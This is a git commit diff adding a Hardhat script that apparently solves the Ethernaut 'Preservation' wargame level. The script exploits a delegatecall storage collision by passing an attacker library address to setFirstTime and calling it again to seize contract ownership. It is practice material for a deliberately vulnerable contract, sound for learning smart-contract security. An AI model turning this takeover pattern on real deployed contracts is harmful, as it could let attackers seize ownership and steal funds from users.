cb103a9f7bbe95d8b45d6df7950e15bf909cd1e7
Crys <mariano.christopher123@gmail.com>
2022-11-01 22:04:00 +0800

    updated preservation attck

--- scripts/attackPreservation.ts
+++ scripts/attackPreservation.ts
@@ -1,8 +1,17 @@
 import { ethers } from "hardhat";
 
 async function attackPreservation() {
-    // change contract addresses here. change gas only if needed.
-   
+    // change contract addresses here.
+    const preservationAddress = "";
+    const attackLibraryAddress = "";
+    // change player address same as yyour player address in ethernauts
+    const player = "";
+    // no change here. attack starts here.
+    const contract = await ethers.getContractAt("PreservationSample", preservationAddress);
+    await contract.setFirstTime(attackLibraryAddress);
+    await contract.setFirstTime(1);
+    const owner = ((await contract.owner()) === player).toString();
+    console.log(`Passed this level: ${owner}`);
 }
 
 attackPreservation()
